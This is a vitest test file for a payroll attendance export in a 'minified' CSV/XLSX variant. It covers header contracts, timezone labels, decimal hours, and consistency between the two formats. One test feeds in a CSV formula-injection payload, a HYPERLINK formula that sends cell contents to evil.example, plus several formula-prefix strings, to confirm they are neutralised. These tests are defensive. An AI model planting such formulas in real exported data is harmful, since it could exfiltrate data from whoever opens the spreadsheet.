import { EXPORT_VARIANT_COLUMNS, ExportVariant, type ReportSummary } from '@wasel/contracts';
import { describe, expect, it } from 'vitest';
import { csvField, csvRow } from '../export/csv.js';
import { EXPORT_COLUMNS, TIMEZONE_CHANGED_NOTE } from '../export/export-columns.js';
import { exportSheet } from '../export/export-sheet.js';
import {
  MINIFIED_COLUMNS,
  minifiedCsvCells,
  minifiedHeaders,
  minifiedXlsxCells,
} from '../export/minified-columns.js';
import { reportRecord } from './fixtures.js';

const RIYADH = 'Asia/Riyadh';

/** The column a header names, so an assertion cannot drift onto its neighbour. */
const columnAt = (header: string): number => {
  const index = MINIFIED_COLUMNS.findIndex((column) => column.header === header);
  if (index < 0) throw new Error(`No minified column named "${header}"`);
  return index;
};

const WORK_DATE = columnAt('Work date');
const EMPLOYEE = columnAt('Employee');
const CHECK_IN = columnAt('Check-in');
const CHECK_OUT = columnAt('Check-out');
const HOURS = columnAt('Total hours');

describe('the published column contract', () => {
  /**
   * The client draws its "what you will get" list from `EXPORT_VARIANT_COLUMNS`,
   * before the download rather than after it. A list that has drifted from the
   * real headers is worse than no list: it is a promise the file then breaks, and
   * the whole point of showing it is to stop somebody exporting the wrong sheet
   * twice.
   */
  it('matches the headers each variant actually writes', () => {
    expect(EXPORT_COLUMNS.map((column) => column.header)).toEqual([
      ...EXPORT_VARIANT_COLUMNS[ExportVariant.DETAILED],
    ]);
    expect(MINIFIED_COLUMNS.map((column) => column.header)).toEqual([
      ...EXPORT_VARIANT_COLUMNS[ExportVariant.MINIFIED],
    ]);
  });

  it('routes each variant to its own sheet, and nothing else', () => {
    expect(exportSheet(ExportVariant.DETAILED).columns).toBe(EXPORT_COLUMNS);
    expect(exportSheet(ExportVariant.MINIFIED).columns).toBe(MINIFIED_COLUMNS);
    expect(exportSheet(ExportVariant.MINIFIED).headers).toBe(minifiedHeaders);
  });

  it('carries the four fields that were asked for and the day they fall on', () => {
    expect(MINIFIED_COLUMNS).toHaveLength(5);
    // The detailed sheet's investigative columns are the ones this variant exists
    // to leave out; a reader transcribing four numbers must not be able to land
    // on "check-in GPS accuracy" by mistake.
    const headers = MINIFIED_COLUMNS.map((column) => column.header).join('|');
    for (const absent of ['Email', 'distance', 'accuracy', 'geofence', 'Late', 'Status', 'site']) {
      expect(headers).not.toContain(absent);
    }
  });
});

describe('minifiedHeaders', () => {
  it('names the zone on exactly the two columns that render an instant', () => {
    const headers = minifiedHeaders(RIYADH, false);

    expect(headers).toEqual([
      'Work date',
      'Employee',
      `Check-in (${RIYADH})`,
      `Check-out (${RIYADH})`,
      'Total hours',
    ]);
    // `Work date` is stored, not rendered: it was assigned in whatever zone was in
    // force at punch time and is deliberately never restated.
    expect(headers[WORK_DATE]).toBe('Work date');
  });

  it('carries the timezone-change warning the detailed sheet carries', () => {
    const headers = minifiedHeaders(RIYADH, true);

    // The same note, in the same place, for the same reason: a CSV is a bare
    // rectangle and a column title is the only place in it a sentence can go.
    // A minified sheet that quietly dropped the warning would be the file two
    // exports of one month disagree in, with nothing to explain why.
    expect(headers.filter((header) => header.includes(TIMEZONE_CHANGED_NOTE))).toHaveLength(2);
    expect(headers[CHECK_IN]).toBe(`Check-in (${RIYADH}; ${TIMEZONE_CHANGED_NOTE})`);
    expect(headers[CHECK_OUT]).toBe(`Check-out (${RIYADH}; ${TIMEZONE_CHANGED_NOTE})`);
  });
});

describe('total hours', () => {
  it('is a real number in the workbook, so the column can be summed', () => {
    // 496 minutes is 8:16 — deliberately not a round number of hours, because a
    // fixture of exactly 8:00 would pass whether the cell held a number or the
    // string "8".
    const cells = minifiedXlsxCells(reportRecord({ workedMinutes: 496 }), RIYADH);

    expect(cells[HOURS]).toBe(496 / 60);
    expect(typeof cells[HOURS]).toBe('number');
    // Exact, not pre-rounded: the column's number format is what shows `8.27`,
    // and keeping the value underneath exact is what makes a column of them add
    // up to the same total the Summary sheet states.
    expect(cells[HOURS]).not.toBe(8.27);
  });

  it('renders in the CSV exactly what the workbook displays', () => {
    expect(minifiedCsvCells(reportRecord({ workedMinutes: 496 }), RIYADH)[HOURS]).toBe('8.27');
    expect(minifiedCsvCells(reportRecord({ workedMinutes: 480 }), RIYADH)[HOURS]).toBe('8.00');
    expect(minifiedCsvCells(reportRecord({ workedMinutes: 30 }), RIYADH)[HOURS]).toBe('0.50');
    expect(MINIFIED_COLUMNS[HOURS]?.numFmt).toBe('0.00');
  });

  /**
   * Decimal rather than `h:mm`, and the CSV is why.
   *
   * `8:16` in a CSV is not a duration to Excel, it is a time of day: the import
   * parses it to 0.344 of a day, so a column of them sums to a fifth of the
   * truth and formats as a clock reading. The person doing that summing is
   * running payroll.
   */
  it('is a plain number, not a clock reading', () => {
    const rendered = minifiedCsvCells(reportRecord({ workedMinutes: 496 }), RIYADH)[HOURS];
    expect(rendered).not.toContain(':');
    expect(Number(rendered)).toBeCloseTo(8.27, 5);
  });

  it('is blank, not zero, while a shift is still open', () => {
    const open = reportRecord({ checkOutAt: null, checkOutSite: null, workedMinutes: null });

    // A zero is a claim that the person worked nothing, and it is summed as one.
    expect(minifiedXlsxCells(open, RIYADH)[HOURS]).toBeNull();
    expect(minifiedCsvCells(open, RIYADH)[HOURS]).toBeNull();
    expect(minifiedXlsxCells(open, RIYADH)[CHECK_OUT]).toBeNull();
    expect(csvField(minifiedCsvCells(open, RIYADH)[HOURS])).toBe('');
  });

  it('distinguishes a genuine zero-minute day from an open shift', () => {
    expect(minifiedXlsxCells(reportRecord({ workedMinutes: 0 }), RIYADH)[HOURS]).toBe(0);
    expect(minifiedCsvCells(reportRecord({ workedMinutes: 0 }), RIYADH)[HOURS]).toBe('0.00');
  });

  it('adds up to the same total the summary states', () => {
    // The property a reader exercises by selecting the column: the sum of the
    // stored values, not of their rendered text, is the range's real total.
    const minutes = [496, 481, 507, 33, 0];
    const stored = minutes.map(
      (workedMinutes) =>
        minifiedXlsxCells(reportRecord({ workedMinutes }), RIYADH)[HOURS] as number,
    );
    const summary: Pick<ReportSummary, 'totalWorkedMinutes'> = {
      totalWorkedMinutes: minutes.reduce((total, value) => total + value, 0),
    };
    expect(stored.reduce((total, value) => total + value, 0)).toBeCloseTo(
      summary.totalWorkedMinutes / 60,
      10,
    );
  });
});

describe('minified cells', () => {
  it('keeps the work date and both instants as real date cells in the workbook', () => {
    const cells = minifiedXlsxCells(reportRecord(), RIYADH);

    expect(cells[WORK_DATE]).toBeInstanceOf(Date);
    expect(cells[CHECK_IN]).toBeInstanceOf(Date);
    // 05:47 UTC is 08:47 on the Riyadh wall clock, relabelled as UTC so the cell
    // displays what the employee's own clock said while staying sortable.
    expect((cells[CHECK_IN] as Date).toISOString()).toBe('2026-03-01T08:47:00.000Z');
    expect((cells[CHECK_OUT] as Date).toISOString()).toBe('2026-03-01T17:03:00.000Z');
  });

  it('renders the same instants as wall clock text in the CSV', () => {
    const cells = minifiedCsvCells(reportRecord(), RIYADH);

    expect(cells[WORK_DATE]).toBe('2026-03-01');
    expect(cells[CHECK_IN]).toBe('2026-03-01 08:47');
    expect(cells[CHECK_OUT]).toBe('2026-03-01 17:03');
  });

  /**
   * The attack the whole export path is hardened against, on the one string
   * column this sheet has left. Fewer columns is fewer places to get it wrong,
   * not permission to.
   */
  it('neutralises a formula in an employee name in both formats', () => {
    const hostile = '=HYPERLINK("http://evil.example/?d="&A2,"Click")';
    const record = reportRecord({
      user: { fullName: hostile, email: 'x@wasel.test', employeeCode: 'X-1' },
    });

    expect(minifiedXlsxCells(record, RIYADH)[EMPLOYEE]).toBe(`'${hostile}`);
    // The CSV hands the raw value to `csvField`, which is the single place the
    // rule lives — so the rendered line carries the apostrophe too, with the
    // embedded quotes doubled per RFC 4180.
    expect(csvRow(minifiedCsvCells(record, RIYADH))).toContain(
      `"'=HYPERLINK(""http://evil.example/?d=""&A2,""Click"")"`,
    );
  });

  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1'])(
    'neutralises the name %j in the workbook',
    (payload) => {
      const record = reportRecord({
        user: { fullName: payload, email: 'x@wasel.test', employeeCode: null },
      });
      expect(minifiedXlsxCells(record, RIYADH)[EMPLOYEE]).toBe(`'${payload}`);
      expect(csvField(minifiedCsvCells(record, RIYADH)[EMPLOYEE])).toContain(`'${payload}`);
    },
  );

  it('preserves a non-ASCII name verbatim in both formats', () => {
    const record = reportRecord({
      user: { fullName: 'أحمد الغامدي', email: 'a@wasel.test', employeeCode: 'A-1' },
    });

    expect(minifiedXlsxCells(record, RIYADH)[EMPLOYEE]).toBe('أحمد الغامدي');
    expect(csvField(minifiedCsvCells(record, RIYADH)[EMPLOYEE])).toBe('أحمد الغامدي');
  });

  it('says the same thing about the same cell in both formats', () => {
    // A CSV and an XLSX of one range that disagree is a payroll dispute with two
    // answers, so the two writers must at least agree on shape and on emptiness.
    for (const record of [
      reportRecord(),
      reportRecord({ checkOutAt: null, workedMinutes: null }),
    ]) {
      const csv = minifiedCsvCells(record, RIYADH);
      const xlsx = minifiedXlsxCells(record, RIYADH);

      expect(csv).toHaveLength(MINIFIED_COLUMNS.length);
      expect(xlsx).toHaveLength(MINIFIED_COLUMNS.length);
      for (const [index] of MINIFIED_COLUMNS.entries()) {
        expect(csv[index] === null).toBe(xlsx[index] === null);
      }
    }
  });
});
